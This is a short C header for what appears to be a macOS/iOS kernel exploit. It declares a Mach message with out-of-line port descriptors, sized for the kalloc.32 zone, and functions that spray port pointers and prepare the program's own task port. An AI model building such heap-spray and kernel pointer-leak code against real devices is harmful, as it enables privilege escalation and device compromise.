#ifndef MACH_PORTS_H
#define MACH_PORTS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

// 8 * 4 B = 32 B -> Allocation in kalloc.32
#define N_PORTS_LEAK 8

#define N_OOL_PORTS_DESCRIPTOR 0x190

struct ool_leak_msg {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports[];
};

typedef struct ool_leak_msg * ool_leak_msg_t;

int prepare_ports(mach_port_t *receive_port, mach_port_t *target_port, mach_port_t *own_task_port);
int spray_port_pointer(mach_port_t receive_port, mach_port_t target_port, mach_port_t other_port);

#endif /* ! MACH_PORTS_H */